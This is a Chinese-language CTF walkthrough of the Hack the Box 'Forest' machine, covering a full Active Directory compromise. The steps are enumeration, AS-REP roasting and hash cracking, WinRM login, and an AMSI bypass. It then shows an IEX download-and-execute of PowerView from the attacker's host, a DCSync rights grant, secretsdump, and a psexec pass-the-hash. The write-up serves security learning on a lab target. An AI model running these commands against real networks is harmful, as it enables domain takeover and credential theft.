---
title: Forest
date: 2021-12-24 13:52:39
tags: Hack the Box
categories: 内网
---

## 靶机信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/2913cb4eedb44306869932340084824e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 信息收集

```bash
nmap -sV -sS -Pn -A -p1-65535 10.10.10.161
```

```bash
Nmap scan report for 10.10.10.161
Host is up (0.32s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-21 11:03:55Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  unknown
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  unknown
49931/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/21%OT=53%CT=1%CU=36900%PV=Y%DS=2%DC=T%G=Y%TM=617148
OS:13%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS
OS:=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8
OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:4DNW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O
OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-10-21T04:05:16-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-21T11:05:15
|_  start_date: 2021-10-21T07:03:53

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   321.85 ms 10.10.14.1
2   321.83 ms 10.10.10.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3716.43 seconds
```

<!--more-->

我们发现可以进行匿名登录，我们尝试匿名登录SMB服务，看看有哪些有价值的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/e568f2f0f0ef419da569481703bc97f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
答案是没有，没有什么共享信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/9315d9655d274be9baf1173d824bbf38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

上面信息收集时发现了ldap服务，那我们尝试使用ldapsearch工具对`namingcontexts`字段进行发掘
![在这里插入图片描述](https://img-blog.csdnimg.cn/5159dbdc249c4274ba73c56d802ba67c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试更深入地挖掘DN信息，并尝试获取域中的用户列表
![在这里插入图片描述](https://img-blog.csdnimg.cn/412eb99806c84827a8d4924b17aab912.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们还可以使用`enum4linux`获取用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/295e9874f8a94b21b77a12fd68e7de09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们将搜集的信息保存为一个`anon_ldap.txt`文件，过滤出`svc-alfresco`用户的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/323186c2631f445e8f56396ebc761eef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们拿到账号和用户名后，我们得检查一下是否启用了预认证，这里解释一下什么是预认证

> **在请求 TGT（票证授予票证）时，第一步，请求方（用户）使用自己的 NTLM 哈希加密时间戳，并将其发送到 KDC（密钥分发中心），即域控制器。现在，如果 KDC 使用请求用户的 NTLM 哈希成功解密时间戳，KDC 将知道请求用户是有效用户。
> 可以禁用此检查（这不是默认情况）。在这种情况下，KDC 不会验证请求 TGT 的用户是否有效，而是将 TGT 发送回请求者。
> 该 TGT 包含使用请求用户的 NTLM 哈希加密的部分数据，这意味着我们可以将哈希脱机并尝试破解它。**

那我们可以使用`impacket`包中的`GetNPUsers.py`这个脚本去请求TGT，直接获取易受攻击的用户名及对应的哈希值
![在这里插入图片描述](https://img-blog.csdnimg.cn/5284eb6938a448ed9fc2c450536c9ebc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们使用`john`来破解这个hash值，破解的明文值为`s3rvice`
![在这里插入图片描述](https://img-blog.csdnimg.cn/171d16fb086e4306aed46bcfde8464e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们也可以用hashcat来破解

```bash
hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac55b719cfc140b1ada3ab3f1ec23de1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为上边我们扫描到主机开放了5985端口，那证明主机开放了WinRM服务

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/391c73ad0f65465dbec84f80162fe866.png)
## 提权
我们使用Bloodhound这个工具查询是否有潜在的提权路径，首先我们得先把客户端`SharpHound.exe`上传到目标主机上，并运行它
![在这里插入图片描述](https://img-blog.csdnimg.cn/df95f275e38340aba9d52b2aa90c838e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/eaa70b145a0143d790b4d8c629a36d7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
为了方便我们传输，我们在本机上搭建一个SMB服务器
![在这里插入图片描述](https://img-blog.csdnimg.cn/a6dcecf002764ceb89b526cfc469f895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们将压缩包复制到本机上
![在这里插入图片描述](https://img-blog.csdnimg.cn/9c2108c5892d4762af178e042896411e.png)
在攻击机上启动bloodhound，并将压缩包拖进bloodhound中
![在这里插入图片描述](https://img-blog.csdnimg.cn/0e1aedb210f74238ba29dd65d3cfb738.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后点击最后一个选项，查看可以进行哈希传递的用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/7d5109e17fd740c08689be66a2ce0c35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后再点击这个选项
![在这里插入图片描述](https://img-blog.csdnimg.cn/e417b9a4c91442eeb7e5f52dc99ec7be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/6899426da41d42139be684f6f99e7772.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
可以看到`svc-alfresco`这个用户是属于`service account`这个组的成员，同时它也是`Privileged IT Accounts`的成员，它也是`account operators`的成员。它允许该组的成员创建和修改用户并将其添加到不受保护的组
![在这里插入图片描述](https://img-blog.csdnimg.cn/e2cdb6b465b74640a64b7ea297939ce3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们现在点击`Shortest Paths to High Value Targets`，查看去往高权限目标的路径。该用户具有`GenericAll`的权限和`Exchange Windows`权限组。在`Exchange Windows`权限组具有`WriteDacl`在域的权限。该`WriteDacl`权限使用户能够向对象添加`DACL`（自由访问控制列表）。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c6d80a75b47946b2bb2b74041117d941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
**那就意味着：**

 **1. 我们可以将用户添加到Exchange Windows 权限组。
 2. 然后，由于 Exchange 组有WriteDacl权限，我们可以将DCSync权限授予我们创建的用户。**

>  **DCsync是几个权限的集合体，是域渗透中经常会用到的技术，如果普通用户想具有DCsync权限，可以给对象添加以下三条ACE：
>  DS-Replication-Get-Changes，对应GUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
>  DS-Replication-Get-Changes-All，对应GUID为：1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
>  DS-Replication-Get-Changes-In-Filtered-Set，对应GUID为：89e95b76-444d-4c62-991a-0facbeda640c**

## DCSync
首先我们先将用户添加到域中
![在这里插入图片描述](https://img-blog.csdnimg.cn/412def70d225418188f892346169b474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们将用户添加到`Exchange Windows`权限组
![在这里插入图片描述](https://img-blog.csdnimg.cn/ead54544e07d4f67bcb1f4d5c4c973d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们看看菜单，我们选择`Bypass-4MSI`，`Bypass-4MSI`命令用于在导入脚本之前规避防御者。接下来，我们可以使用`Add-ObjectACL`和`john`的凭证，并给他`DCSync`权限。
![在这里插入图片描述](https://img-blog.csdnimg.cn/84b58436b0f54790bfdc7e1e5823e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后输入以下的powershell的代码

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/PowerView.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Secpassword = ConvertTo-SecureString 'password1234' -asplaintext -force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\pyh',$Secpassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pyh -Rights DCSync
```
开启一个小型服务器
![在这里插入图片描述](https://img-blog.csdnimg.cn/37f75053912d4977b8ec82cc263da07f.png)
执行完成后，我们使用`secretdumps.py`脚本获取用户名对应的哈希值。这里我们获取到了管理员的哈希值
![在这里插入图片描述](https://img-blog.csdnimg.cn/16f9219409ec4fa78100ba391a0cf942.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们只需要使用`psexec.py`脚本来进行哈希传递攻击，获取到超级管理员权限

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/87f2253887984b2f8852806cd45909bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
